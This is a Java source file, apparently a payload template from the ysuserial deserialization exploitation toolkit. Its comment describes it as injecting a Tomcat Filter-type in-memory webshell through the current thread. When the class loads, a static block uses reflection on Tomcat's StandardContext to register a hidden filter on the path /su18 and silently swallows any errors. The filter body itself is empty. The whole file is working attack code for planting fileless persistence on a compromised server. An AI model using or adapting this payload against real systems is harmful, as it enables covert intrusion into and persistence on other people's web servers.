package org.su18.ysuserial.payloads.templates.memshell.tomcat;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.*;

/**
 * 使用线程注入 Tomcat Filter 型内存马
 */
public class TFMSFromThread implements Filter {

	static {
		try {
			final String name       = "su18" + System.nanoTime();
			final String URLPattern = "/su18";

			WebappClassLoaderBase webappClassLoaderBase =
					(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
			StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

			Class<? extends StandardContext> aClass = null;
			try {
				aClass = (Class<? extends StandardContext>) standardContext.getClass().getSuperclass();
				aClass.getDeclaredField("filterConfigs");
			} catch (Exception e) {
				aClass = standardContext.getClass();
				aClass.getDeclaredField("filterConfigs");
			}
			Field Configs = aClass.getDeclaredField("filterConfigs");
			Configs.setAccessible(true);
			Map filterConfigs = (Map) Configs.get(standardContext);

			TFMSFromThread behinderFilter = new TFMSFromThread();

			FilterDef filterDef = new FilterDef();
			filterDef.setFilter(behinderFilter);
			filterDef.setFilterName(name);
			filterDef.setFilterClass(behinderFilter.getClass().getName());

			standardContext.addFilterDef(filterDef);

			FilterMap filterMap = new FilterMap();
			filterMap.addURLPattern(URLPattern);
			filterMap.setFilterName(name);
			filterMap.setDispatcher(DispatcherType.REQUEST.name());

			standardContext.addFilterMapBefore(filterMap);

			Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
			constructor.setAccessible(true);
			ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

			filterConfigs.put(name, filterConfig);
		} catch (Exception ignored) {
		}
	}

	@Override
	public void init(FilterConfig filterConfig) throws ServletException {
	}

	@Override
	public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
	}

	@Override
	public void destroy() {
	}
}